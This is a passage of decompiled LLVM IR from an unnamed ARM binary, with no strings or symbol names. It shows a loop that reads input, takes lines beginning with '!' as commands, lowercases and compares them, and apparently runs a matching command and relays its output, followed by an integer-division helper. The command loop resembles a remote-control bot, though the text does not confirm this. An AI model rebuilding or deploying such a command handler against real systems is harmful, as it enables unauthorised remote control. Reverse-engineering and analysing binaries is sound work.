  %v3_11f18 = call i32 @function_9340(i32 %v2_11f0c, i32 ptrtoint ([5 x i8]* @global_var_225e4.676 to i32))
  br label %dec_label_pc_12394

dec_label_pc_11f20:                               ; preds = %dec_label_pc_11ea4
  %v6_11f34 = call i32 @function_14020(i32 %v2_123a4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_225ec.678, i32 0, i32 0))
  %v9_11f48 = icmp eq i32 %v6_11f34, %v2_123a4
  br i1 %v9_11f48, label %dec_label_pc_11f50, label %dec_label_pc_11f58

dec_label_pc_11f50:                               ; preds = %dec_label_pc_11f20
  %v1_11f54 = call i32 @function_163f8(i32 0)
  br label %dec_label_pc_11f58

dec_label_pc_11f58:                               ; preds = %dec_label_pc_11f20, %dec_label_pc_11f50
  %v2_11f6c = load i8, i8* %v4_123b4, align 4
  %v7_11f70 = icmp eq i8 %v2_11f6c, 33
  br i1 %v7_11f70, label %dec_label_pc_11f94, label %dec_label_pc_12394

dec_label_pc_11f94:                               ; preds = %dec_label_pc_11f58, %dec_label_pc_11fa4
  %v3_11f78.sink = phi i8* [ %storemerge6, %dec_label_pc_11fa4 ], [ %v4_123b4, %dec_label_pc_11f58 ]
  %v4_11f78 = ptrtoint i8* %v3_11f78.sink to i32
  %v1_11f7c = add i32 %v4_11f78, 1
  %storemerge6 = inttoptr i32 %v1_11f7c to i8*
  %v2_11f98 = load i8, i8* %storemerge6, align 1
  %v7_11f9c = icmp eq i8 %v2_11f98, 32
  br i1 %v7_11f9c, label %dec_label_pc_11fb4, label %dec_label_pc_11fa4

dec_label_pc_11fa4:                               ; preds = %dec_label_pc_11f94
  %v2_11fa8 = load i8, i8* %storemerge6, align 1
  %v2_11fac = icmp eq i8 %v2_11fa8, 0
  br i1 %v2_11fac, label %dec_label_pc_11fb4, label %dec_label_pc_11f94

dec_label_pc_11fb4:                               ; preds = %dec_label_pc_11fa4, %dec_label_pc_11f94
  %v2_11fb8 = load i8, i8* %storemerge6, align 1
  %v2_11fbc = icmp eq i8 %v2_11fb8, 0
  br i1 %v2_11fbc, label %dec_label_pc_12394, label %dec_label_pc_11fc4

dec_label_pc_11fc4:                               ; preds = %dec_label_pc_11fb4
  store i8 0, i8* %storemerge6, align 1
  store i32 %v1_11fd4, i32* @r0, align 4
  %v0_11fe4 = call i32 @function_13f70()
  %v2_11ff4 = add i32 %v0_11fe4, %v2_123a4
  %v1_11ff8 = add i32 %v2_11ff4, 2
  %v1_1202c = add i32 %v2_11ff4, 1
  br label %dec_label_pc_12028

dec_label_pc_12004:                               ; preds = %dec_label_pc_12050, %dec_label_pc_12028
  store i32 %v1_11ff8, i32* @r0, align 4
  %v0_12014 = call i32 @function_13f70()
  %v2_1201c = add i32 %v1_1202c, %v0_12014
  %v3_12024 = inttoptr i32 %v2_1201c to i8*
  store i8 0, i8* %v3_12024, align 1
  br label %dec_label_pc_12028

dec_label_pc_12028:                               ; preds = %dec_label_pc_11fc4, %dec_label_pc_12004
  store i32 %v1_11ff8, i32* @r0, align 4
  %v0_12038 = call i32 @function_13f70()
  %v2_12040 = add i32 %v1_1202c, %v0_12038
  %v1_12044 = inttoptr i32 %v2_12040 to i8*
  %v2_12044 = load i8, i8* %v1_12044, align 1
  %v7_12048 = icmp eq i8 %v2_12044, 10
  br i1 %v7_12048, label %dec_label_pc_12004, label %dec_label_pc_12050

dec_label_pc_12050:                               ; preds = %dec_label_pc_12028
  store i32 %v1_1202c, i32* @r4, align 4
  store i32 %v1_11ff8, i32* @r0, align 4
  %v0_12060 = call i32 @function_13f70()
  %v0_12068 = load i32, i32* @r4, align 4
  %v2_12068 = add i32 %v0_12068, %v0_12060
  %v1_1206c = inttoptr i32 %v2_12068 to i8*
  %v2_1206c = load i8, i8* %v1_1206c, align 1
  %v7_12070 = icmp eq i8 %v2_1206c, 13
  br i1 %v7_12070, label %dec_label_pc_12004, label %dec_label_pc_12090.preheader

dec_label_pc_12090.preheader:                     ; preds = %dec_label_pc_12050
  %stack_var_-72.018 = inttoptr i32 %v1_11ff8 to i8*
  %v2_1209419 = load i8, i8* %stack_var_-72.018, align 1
  %v7_1209823 = icmp eq i8 %v2_1209419, 32
  br i1 %v7_1209823, label %dec_label_pc_120b0, label %dec_label_pc_120a0

dec_label_pc_12084:                               ; preds = %dec_label_pc_120a0
  %v1_12088 = add i32 %stack_var_-72.0.in24, 1
  %stack_var_-72.0 = inttoptr i32 %v1_12088 to i8*
  %v2_12094 = load i8, i8* %stack_var_-72.0, align 1
  %v7_12098 = icmp eq i8 %v2_12094, 32
  br i1 %v7_12098, label %dec_label_pc_120b0, label %dec_label_pc_120a0

dec_label_pc_120a0:                               ; preds = %dec_label_pc_12090.preheader, %dec_label_pc_12084
  %stack_var_-72.025 = phi i8* [ %stack_var_-72.0, %dec_label_pc_12084 ], [ %stack_var_-72.018, %dec_label_pc_12090.preheader ]
  %stack_var_-72.0.in24 = phi i32 [ %v1_12088, %dec_label_pc_12084 ], [ %v1_11ff8, %dec_label_pc_12090.preheader ]
  %v2_120a4 = load i8, i8* %stack_var_-72.025, align 1
  %v2_120a8 = icmp eq i8 %v2_120a4, 0
  br i1 %v2_120a8, label %dec_label_pc_120b0, label %dec_label_pc_12084

dec_label_pc_120b0:                               ; preds = %dec_label_pc_12084, %dec_label_pc_120a0, %dec_label_pc_12090.preheader
  %stack_var_-72.0.in.lcssa = phi i32 [ %v1_11ff8, %dec_label_pc_12090.preheader ], [ %v1_12088, %dec_label_pc_12084 ], [ %stack_var_-72.0.in24, %dec_label_pc_120a0 ]
  %stack_var_-72.0.lcssa = phi i8* [ %stack_var_-72.018, %dec_label_pc_12090.preheader ], [ %stack_var_-72.0, %dec_label_pc_12084 ], [ %stack_var_-72.025, %dec_label_pc_120a0 ]
  store i8 0, i8* %stack_var_-72.0.lcssa, align 1
  %v1_120c0 = add i32 %stack_var_-72.0.in.lcssa, 1
  %v2_1210430 = load i8, i8* %stack_var_-72.018, align 1
  %v2_1210832 = icmp eq i8 %v2_1210430, 0
  br i1 %v2_1210832, label %dec_label_pc_12110, label %dec_label_pc_120d4

dec_label_pc_120d4:                               ; preds = %dec_label_pc_120b0, %dec_label_pc_120d4
  %storemerge534 = phi i8* [ %storemerge5, %dec_label_pc_120d4 ], [ %stack_var_-72.018, %dec_label_pc_120b0 ]
  %storemerge1433 = phi i32 [ %v1_120f8, %dec_label_pc_120d4 ], [ %v1_11ff8, %dec_label_pc_120b0 ]
  %v2_120d8 = load i8, i8* %storemerge534, align 1
  %v3_120d8 = zext i8 %v2_120d8 to i32
  %v1_120e0 = call i32 @function_12af4(i32 %v3_120d8)
  %v1_120f0 = trunc i32 %v1_120e0 to i8
  store i8 %v1_120f0, i8* %storemerge534, align 1
  %v1_120f8 = add i32 %storemerge1433, 1
  %storemerge5 = inttoptr i32 %v1_120f8 to i8*
  %v2_12104 = load i8, i8* %storemerge5, align 1
  %v2_12108 = icmp eq i8 %v2_12104, 0
  br i1 %v2_12108, label %dec_label_pc_12110, label %dec_label_pc_120d4

dec_label_pc_12110:                               ; preds = %dec_label_pc_120d4, %dec_label_pc_120b0
  store i32 ptrtoint ([5 x i8]* @global_var_225f0.680 to i32), i32* @r1, align 4
  %v4_1211c = call i32 @function_13fe0(i8* %stack_var_-72.018, i32 ptrtoint ([5 x i8]* @global_var_225f0.680 to i32))
  store i32 %v4_1211c, i32* @r0, align 4
  %v2_12124 = icmp eq i32 %v4_1211c, 0
  br i1 %v2_12124, label %dec_label_pc_1212c, label %dec_label_pc_12210

dec_label_pc_1212c:                               ; preds = %dec_label_pc_12110
  %v0_1212c = call i32 @function_a600()
  %v2_12134 = icmp eq i32 %v0_1212c, 0
  br i1 %v2_12134, label %dec_label_pc_1213c, label %dec_label_pc_12394

dec_label_pc_1213c:                               ; preds = %dec_label_pc_1212c
  store i32 1024, i32* @r2, align 4
  %v3_12154 = call i32 @function_13ed0(i8* %v2_12154, i32 0)
  %v6_12174 = call i32 @function_92f8(i32 %v2_12144, i32 ptrtoint ([8 x i8]* @global_var_225f8.682 to i32), i32 %v1_120c0, i32 %v2_12144, i32 ptrtoint (i32* @0 to i32))
  %v3_12190 = call i32 @function_940c(i32 %v2_12144, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_22600.684, i32 0, i32 0))
  br label %dec_label_pc_121d8

dec_label_pc_121a0:                               ; preds = %dec_label_pc_121d8
  %v1_121b0 = call i32 @function_89a8(i32 %v2_12144)
  store i32 1024, i32* @r2, align 4
  %v3_121cc = call i32 @function_13ed0(i8* %v2_12154, i32 0)
  %v1_121d4 = call i32 @function_164b0(i32 1)
  br label %dec_label_pc_121d8

dec_label_pc_121d8:                               ; preds = %dec_label_pc_1213c, %dec_label_pc_121a0
  %v4_121f0 = call i32 @function_981c(i32 %v2_12144, i32 1024, i32 %v3_12190, i32 %v2_12144)
  %v2_121f8 = icmp eq i32 %v4_121f0, 0
  br i1 %v2_121f8, label %dec_label_pc_12200, label %dec_label_pc_121a0

dec_label_pc_12200:                               ; preds = %dec_label_pc_121d8
  %v1_12204 = call i32 @function_9694(i32 %v3_12190)
  %v1_1220c = call i32 @function_163f8(i32 0)
  br label %dec_label_pc_12210

dec_label_pc_12210:                               ; preds = %dec_label_pc_12110, %dec_label_pc_12200
  %v2_12224 = call i32 @function_143f8(i32 %v1_120c0, i32 ptrtoint (i32* @global_var_22604.686 to i32))
  store i32 %v1_11ff8, i32* %stack_var_-140, align 4
  %v2_1231c36 = icmp eq i32 %v2_12224, 0
  br i1 %v2_1231c36, label %dec_label_pc_12324, label %dec_label_pc_1223c

dec_label_pc_1223c:                               ; preds = %dec_label_pc_12210, %dec_label_pc_12304
  %stack_var_-44.0.in38 = phi i32 [ %v2_1230c, %dec_label_pc_12304 ], [ %v2_12224, %dec_label_pc_12210 ]
  %stack_var_-48.137 = phi i32 [ %stack_var_-48.0, %dec_label_pc_12304 ], [ 1, %dec_label_pc_12210 ]
  %stack_var_-44.0 = inttoptr i32 %stack_var_-44.0.in38 to i8*
  %v2_12240 = load i8, i8* %stack_var_-44.0, align 1
  %v7_12244 = icmp eq i8 %v2_12240, 10
  br i1 %v7_12244, label %dec_label_pc_12304, label %dec_label_pc_1224c

dec_label_pc_1224c:                               ; preds = %dec_label_pc_1223c
  store i32 %stack_var_-48.137, i32* @r4, align 4
  store i32 %stack_var_-44.0.in38, i32* @r0, align 4
  %v0_12258 = call i32 @function_13f70()
  %v1_12260 = add i32 %v0_12258, 1
  %v1_12268 = call i32 @function_14ccc(i32 %v1_12260)
  %v0_12278 = load i32, i32* @r4, align 4
  %v3_12278 = mul i32 %v0_12278, 4
  %v2_12284 = add i32 %v2_12364, %v3_12278
  %v2_12288 = inttoptr i32 %v2_12284 to i32*
  store i32 %v1_12268, i32* %v2_12288, align 4
  %v3_12294 = mul i32 %stack_var_-48.137, 4
  %v2_122a0 = add i32 %v2_12364, %v3_12294
  %v1_122a4 = inttoptr i32 %v2_122a0 to i32*
  %v2_122a4 = load i32, i32* %v1_122a4, align 4
  store i32 %v2_122a4, i32* @r4, align 4
  store i32 %stack_var_-44.0.in38, i32* @r0, align 4
  %v0_122b0 = call i32 @function_13f70()
  %v1_122b8 = add i32 %v0_122b0, 1
  %v0_122bc = load i32, i32* @r4, align 4
  store i32 %v1_122b8, i32* @r2, align 4
  %v2_122c8 = inttoptr i32 %v0_122bc to i8*
  %v3_122c8 = call i32 @function_13ed0(i8* %v2_122c8, i32 0)
  %v2_122e4 = load i32, i32* %v1_122a4, align 4
  store i32 %stack_var_-44.0.in38, i32* @r1, align 4
  %v3_122f4 = inttoptr i32 %v2_122e4 to i8*
  %v4_122f4 = call i32 @function_14210(i8* %v3_122f4, i32 %stack_var_-44.0.in38)
  %v1_122fc = add i32 %stack_var_-48.137, 1
  br label %dec_label_pc_12304

dec_label_pc_12304:                               ; preds = %dec_label_pc_1223c, %dec_label_pc_1224c
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.137, %dec_label_pc_1223c ], [ %v1_122fc, %dec_label_pc_1224c ]
  %v2_1230c = call i32 @function_143f8(i32 0, i32 ptrtoint (i32* @global_var_22604.686 to i32))
  %v2_1231c = icmp eq i32 %v2_1230c, 0
  br i1 %v2_1231c, label %dec_label_pc_12324, label %dec_label_pc_1223c

dec_label_pc_12324:                               ; preds = %dec_label_pc_12304, %dec_label_pc_12210
  %stack_var_-48.1.lcssa = phi i32 [ 1, %dec_label_pc_12210 ], [ %stack_var_-48.0, %dec_label_pc_12304 ]
  %v3_12330 = call i32 @function_10b30(i32 %stack_var_-48.1.lcssa, i32* nonnull %stack_var_-140)
  %v7_1233c = icmp slt i32 %stack_var_-48.1.lcssa, 2
  br i1 %v7_1233c, label %dec_label_pc_12394, label %dec_label_pc_12354.lr.ph

dec_label_pc_12354.lr.ph:                         ; preds = %dec_label_pc_12324
  br label %dec_label_pc_12354

dec_label_pc_12354:                               ; preds = %dec_label_pc_12354.lr.ph, %dec_label_pc_12354
  %storemerge15112 = phi i32 [ 1, %dec_label_pc_12354.lr.ph ], [ %v1_1237c, %dec_label_pc_12354 ]
  %v3_1235c = mul i32 %storemerge15112, 4
  %v2_12368 = add i32 %v2_12364, %v3_1235c
  %v1_1236c = inttoptr i32 %v2_12368 to i32*
  %v2_1236c = load i32, i32* %v1_1236c, align 4
  store i32 %v2_1236c, i32* @r0, align 4
  %v0_12374 = call i32 @function_15850()
  %v1_1237c = add nuw nsw i32 %storemerge15112, 1
  %v5_12390 = icmp slt i32 %v1_1237c, %stack_var_-48.1.lcssa
  br i1 %v5_12390, label %dec_label_pc_12354, label %dec_label_pc_12394

dec_label_pc_12394:                               ; preds = %dec_label_pc_12354, %dec_label_pc_1212c, %dec_label_pc_11f58, %dec_label_pc_12324, %dec_label_pc_11fb4, %dec_label_pc_11f08, %dec_label_pc_11b78
  %v2_12398 = load i32, i32* @global_var_2c890.36, align 4
  %v5_123b4 = call i32 @function_9fc4(i32 %v2_12398, i8* %v4_123b4, i32 4096, i32 %v2_123a4)
  %v3_123c4 = icmp eq i32 %v5_123b4, -1
  br i1 %v3_123c4, label %dec_label_pc_11b5c, label %dec_label_pc_11e30

; uselistorder directives
  uselistorder i32 %v5_123b4, { 1, 0 }
  uselistorder i32 %stack_var_-48.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_1230c, { 1, 0 }
  uselistorder i32 %stack_var_-48.137, { 1, 3, 0, 2 }
  uselistorder i32 %stack_var_-44.0.in38, { 4, 3, 2, 1, 0 }
  uselistorder i8* %storemerge5, { 1, 0 }
  uselistorder i32 %v1_120f8, { 1, 0 }
  uselistorder i8* %storemerge534, { 1, 0 }
  uselistorder i32 %v1_120c0, { 1, 0 }
  uselistorder i8* %stack_var_-72.018, { 3, 0, 4, 2, 1, 5 }
  uselistorder i32 %v1_1202c, { 2, 1, 0 }
  uselistorder i32 %v1_11ff8, { 5, 0, 2, 1, 3, 6, 7, 4 }
  uselistorder i8* %storemerge6, { 0, 1, 3, 4, 2 }
  uselistorder i1 %v9_11e6c, { 1, 0 }
  uselistorder i32 %v3_11e80, { 3, 2, 5, 0, 1, 4 }
  uselistorder i32 %v5_11db0, { 1, 0 }
  uselistorder i32 %v3_11de4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_11d58, { 1, 0 }
  uselistorder i32 %v1_11d3c, { 1, 0 }
  uselistorder i32 %v5_11c7c, { 1, 0 }
  uselistorder i32 %v1_11c14, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_11c30, { 1, 0 }
  uselistorder i32 %v2_11c24, { 1, 0 }
  uselistorder i32 %v2_12364, { 2, 0, 1 }
  uselistorder i32 %v2_12144, { 2, 4, 3, 5, 1, 0 }
  uselistorder i8* %v4_123b4, { 2, 0, 1 }
  uselistorder i32 %v2_123a4, { 8, 0, 3, 4, 5, 6, 7, 1, 2 }
  uselistorder i32 %v2_11afc, { 1, 0 }
  uselistorder i32 %v0_11ae4, { 1, 0, 2, 3 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_143f8, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_981c, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_92f8, { 248, 247, 246, 245, 244, 243, 242, 241, 240, 239, 238, 237, 236, 235, 234, 233, 232, 231, 230, 229, 228, 227, 226, 225, 224, 223, 222, 221, 220, 219, 218, 217, 216, 215, 214, 213, 212, 211, 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36 }
  uselistorder i32 ()* @function_a600, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_12af4, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_89a8, { 1, 0 }
  uselistorder i32* @global_var_2c898.42, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_32af8.45, { 0, 2, 3, 4, 5, 6, 7, 8, 1, 9, 10 }
  uselistorder i32 (i32, i32)* @function_9340, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_14814, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_32aec.554, { 1, 0, 4, 2, 3 }
  uselistorder i32* @global_var_2c890.36, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 (i32)* @function_164b0, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_12714, { 2, 1, 0 }
  uselistorder i32 ()* @function_126e0, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_15e28, { 1, 0 }
  uselistorder i32 (i32*)* @function_1265c, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 13, 14, 15, 16, 8, 9, 10, 11 }
  uselistorder i32 ()* @function_11928, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_12730, { 1, 0 }
  uselistorder label %dec_label_pc_12394, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder label %dec_label_pc_12354, { 1, 0 }
  uselistorder label %dec_label_pc_12304, { 1, 0 }
  uselistorder label %dec_label_pc_1223c, { 1, 0 }
  uselistorder label %dec_label_pc_12210, { 1, 0 }
  uselistorder label %dec_label_pc_121d8, { 1, 0 }
  uselistorder label %dec_label_pc_120d4, { 1, 0 }
  uselistorder label %dec_label_pc_120b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_120a0, { 1, 0 }
  uselistorder label %dec_label_pc_12028, { 1, 0 }
  uselistorder label %dec_label_pc_11f94, { 1, 0 }
  uselistorder label %dec_label_pc_11f58, { 1, 0 }
  uselistorder label %dec_label_pc_11ea4, { 1, 0 }
  uselistorder label %dec_label_pc_11e24, { 1, 0 }
  uselistorder label %dec_label_pc_11d94, { 1, 0 }
  uselistorder label %dec_label_pc_11c64, { 1, 0 }
  uselistorder label %dec_label_pc_11b5c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11b44, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11a08, { 1, 0 }
}

define i32 @function_12418() local_unnamed_addr {
dec_label_pc_12418:
  %v0_12418 = load i32, i32* @r1, align 4
  %v1_12418 = add i32 %v0_12418, -1
  store i32 %v1_12418, i32* @r2, align 4
  %v2_12418 = icmp eq i32 %v0_12418, 0
  %v7_12418 = icmp eq i32 %v0_12418, 1
  %v0_1241c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_12418, i32 %v0_1241c)
  br i1 %v2_12418, label %dec_label_pc_12500, label %dec_label_pc_12424

dec_label_pc_12424:                               ; preds = %dec_label_pc_12418
  %v0_12424 = load i32, i32* @r0, align 4
  %v1_12424 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_12424, %v1_12424
  br i1 %tmp, label %dec_label_pc_1242c, label %dec_label_pc_124b8

dec_label_pc_1242c:                               ; preds = %dec_label_pc_12424
  %v1_1242c = load i32, i32* @r2, align 4
  %v2_1242c = and i32 %v1_1242c, %v1_12424
  %v4_1242c = icmp eq i32 %v2_1242c, 0
  br i1 %v4_1242c, label %dec_label_pc_124c4, label %dec_label_pc_12434

dec_label_pc_12434:                               ; preds = %dec_label_pc_1242c
  %v3_12434 = icmp ult i32 %v1_12424, 536870912
  br i1 %v3_12434, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_12434
  %v4_12438 = mul i32 %v1_12424, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_12434, %.thread
  %v0_12458.pr36.ph = phi i32 [ %v4_12438, %.thread ], [ %v1_12424, %dec_label_pc_12434 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_12434 ]
  store i32 %storemerge133, i32* @r3, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_12458.pr36 = phi i32 [ %v4_1244c, %bb81 ], [ %v0_12458.pr36.ph, %.preheader.preheader ]
  %v1_12450 = phi i32 [ %v4_12450, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_12444 = icmp ugt i32 %v0_12458.pr36, 268435455
  br i1 %v2_12444, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_12458thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_12448 = icmp ult i32 %v0_12458.pr36, %v0_12424
  br i1 %v4_12448, label %bb80, label %dec_label_pc_12458thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_1244c = and i32 %v0_12458.pr36, 268435456
  %v3_1244c = icmp eq i32 %v2_1244c, 0
  %v4_1244c = mul i32 %v0_12458.pr36, 16
  br i1 %v3_1244c, label %bb81, label %dec_label_pc_12458.loopexit

bb81:                                             ; preds = %bb80
  %v2_12450 = and i32 %v1_12450, 268435456
  %v3_12450 = icmp eq i32 %v2_12450, 0
  %v4_12450 = mul i32 %v1_12450, 16
  store i32 %v4_12450, i32* @r3, align 4
  br i1 %v3_12450, label %.preheader, label %dec_label_pc_12458thread-pre-split.loopexit.loopexit

dec_label_pc_12458thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_1246448.ph = phi i32 [ %v1_12450, %bb ], [ %v4_12450, %bb81 ]
  %v0_12458.pr38.ph = phi i32 [ %v0_12458.pr36, %bb ], [ %v4_1244c, %bb81 ]
  br label %dec_label_pc_12458thread-pre-split.loopexit

dec_label_pc_12458thread-pre-split.loopexit:      ; preds = %dec_label_pc_12458thread-pre-split.loopexit.loopexit, %.thread2
  %v1_1246448 = phi i32 [ %v1_12450, %.thread2 ], [ %v1_1246448.ph, %dec_label_pc_12458thread-pre-split.loopexit.loopexit ]
  %v0_12458.pr38 = phi i32 [ %v0_12458.pr36, %.thread2 ], [ %v0_12458.pr38.ph, %dec_label_pc_12458thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12458thread-pre-split

dec_label_pc_12458thread-pre-split:               ; preds = %dec_label_pc_12458thread-pre-split.loopexit, %bb83
  %v1_1246446 = phi i32 [ %v1_1246448, %dec_label_pc_12458thread-pre-split.loopexit ], [ %v3_12464, %bb83 ]
  %v0_12458.pr = phi i32 [ %v0_12458.pr38, %dec_label_pc_12458thread-pre-split.loopexit ], [ %v3_12460, %bb83 ]
  br label %dec_label_pc_12458

dec_label_pc_12458.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_12458

dec_label_pc_12458:                               ; preds = %dec_label_pc_12458.loopexit, %dec_label_pc_12458thread-pre-split
  %v1_12464 = phi i32 [ %v1_1246446, %dec_label_pc_12458thread-pre-split ], [ %v1_12450, %dec_label_pc_12458.loopexit ]
  %v1_12460 = phi i32 [ %v0_12458.pr, %dec_label_pc_12458thread-pre-split ], [ %v4_1244c, %dec_label_pc_12458.loopexit ]
  %v2_12458 = icmp slt i32 %v1_12460, 0
  br i1 %v2_12458, label %dec_label_pc_1246c, label %bb82

bb82:                                             ; preds = %dec_label_pc_12458
  %v4_1245c = icmp ult i32 %v1_12460, %v0_12424
  br i1 %v4_1245c, label %bb83, label %dec_label_pc_1246c

bb83:                                             ; preds = %bb82
  %v3_12460 = mul i32 %v1_12460, 2
  %v2_12464 = icmp slt i32 %v1_12464, 0
  %v3_12464 = mul i32 %v1_12464, 2
  store i32 %v3_12464, i32* @r3, align 4
  br i1 %v2_12464, label %dec_label_pc_1246c, label %dec_label_pc_12458thread-pre-split

dec_label_pc_1246c:                               ; preds = %bb82, %dec_label_pc_12458, %bb83
  %v2_1247859 = phi i32 [ %v3_12464, %bb83 ], [ %v1_12464, %bb82 ], [ %v1_12464, %dec_label_pc_12458 ]
  %v1_1247051 = phi i32 [ %v3_12460, %bb83 ], [ %v1_12460, %bb82 ], [ %v1_12460, %dec_label_pc_12458 ]
  store i32 0, i32* @r2, align 4
  br label %dec_label_pc_12470

dec_label_pc_12470:                               ; preds = %.thread11, %dec_label_pc_1246c
  %v1_124a4 = phi i32 [ %v4_124a4, %.thread11 ], [ %v2_1247859, %dec_label_pc_1246c ]
  %v1_12478 = phi i32 [ %v0_124b0, %.thread11 ], [ 0, %dec_label_pc_1246c ]
  %v1_124a8 = phi i32 [ %v4_124a8, %.thread11 ], [ %v1_1247051, %dec_label_pc_1246c ]
  %v1_12474 = phi i32 [ %v0_124a0, %.thread11 ], [ %v0_12424, %dec_label_pc_1246c ]
  %v3_12470 = icmp ult i32 %v1_12474, %v1_124a8
  br i1 %v3_12470, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_12470
  %v3_12474 = sub i32 %v1_12474, %v1_124a8
  %v3_12478 = or i32 %v1_12478, %v1_124a4
  store i32 %v3_12478, i32* @r2, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_12470, %bb84
  %v1_12480 = phi i32 [ %v1_12474, %dec_label_pc_12470 ], [ %v3_12474, %bb84 ]
  %v1_12484 = phi i32 [ %v1_12478, %dec_label_pc_12470 ], [ %v3_12478, %bb84 ]
  %v4_1247c = udiv i32 %v1_124a8, 2
  %v6_1247c = icmp ult i32 %v1_12480, %v4_1247c
  br i1 %v6_1247c, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_12480 = urem i32 %v1_124a8, 2
  %v4_12480 = icmp eq i32 %v3_12480, 0
  %v6_12480 = sub i32 %v1_12480, %v4_1247c
  br i1 %v4_12480, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_12484 = udiv i32 %v1_124a4, 2
  %v6_12484 = or i32 %v1_12484, %v5_12484
  store i32 %v6_12484, i32* @r2, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_1248c = phi i32 [ %v6_12480, %bb85 ], [ %v1_12480, %.thread7 ], [ %v6_12480, %bb86 ]
  %v1_12490 = phi i32 [ %v1_12484, %bb85 ], [ %v1_12484, %.thread7 ], [ %v6_12484, %bb86 ]
  %v4_12488 = udiv i32 %v1_124a8, 4
  %v6_12488 = icmp ult i32 %v1_1248c, %v4_12488
  br i1 %v6_12488, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_1248c = and i32 %v1_124a8, 2
  %v4_1248c = icmp eq i32 %v3_1248c, 0
  %v6_1248c = sub i32 %v1_1248c, %v4_12488
  br i1 %v4_1248c, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_12490 = udiv i32 %v1_124a4, 4
  %v6_12490 = or i32 %v1_12490, %v5_12490
  store i32 %v6_12490, i32* @r2, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_12498 = phi i32 [ %v6_1248c, %bb87 ], [ %v1_1248c, %.thread8 ], [ %v6_1248c, %bb88 ]
  %v1_1249c = phi i32 [ %v1_12490, %bb87 ], [ %v1_12490, %.thread8 ], [ %v6_12490, %bb88 ]
  %v4_12494 = udiv i32 %v1_124a8, 8
  %v6_12494 = icmp ult i32 %v1_12498, %v4_12494
  br i1 %v6_12494, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_12498 = and i32 %v1_124a8, 4
  %v4_12498 = icmp eq i32 %v3_12498, 0
  %v6_12498 = sub i32 %v1_12498, %v4_12494
  br i1 %v4_12498, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_1249c = udiv i32 %v1_124a4, 8
  %v6_1249c = or i32 %v1_1249c, %v5_1249c
  store i32 %v6_1249c, i32* @r2, align 4
  br label %thread-pre-split

